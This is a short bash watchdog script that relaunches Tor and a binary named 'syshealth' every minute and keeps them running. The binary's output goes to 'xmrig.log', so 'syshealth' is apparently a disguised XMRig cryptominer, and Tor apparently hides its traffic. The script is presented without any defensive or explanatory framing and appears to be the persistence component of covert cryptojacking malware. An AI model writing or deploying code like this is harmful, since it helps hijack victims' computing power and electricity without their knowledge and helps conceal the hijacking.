#!/bin/bash
# scripts/local_scheduler.sh - Monitor and restart Tor and syshealth

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LOGFILE="$SCRIPT_DIR/xmrig.log"

while true; do
  # Check Tor
  if ! pgrep -x tor > /dev/null; then
    echo "[local_scheduler] Tor not running. Restarting..."
    bash "$SCRIPT_DIR/scripts/local_network.sh"
  fi

  # Check syshealth
  if ! pgrep -f "$SCRIPT_DIR/syshealth" > /dev/null; then
    echo "[local_scheduler] syshealth not running. Restarting..."
    nohup "$SCRIPT_DIR/syshealth" --config="$SCRIPT_DIR/config/preferences.json" >> "$LOGFILE" 2>&1 &
  fi

  sleep 60
done
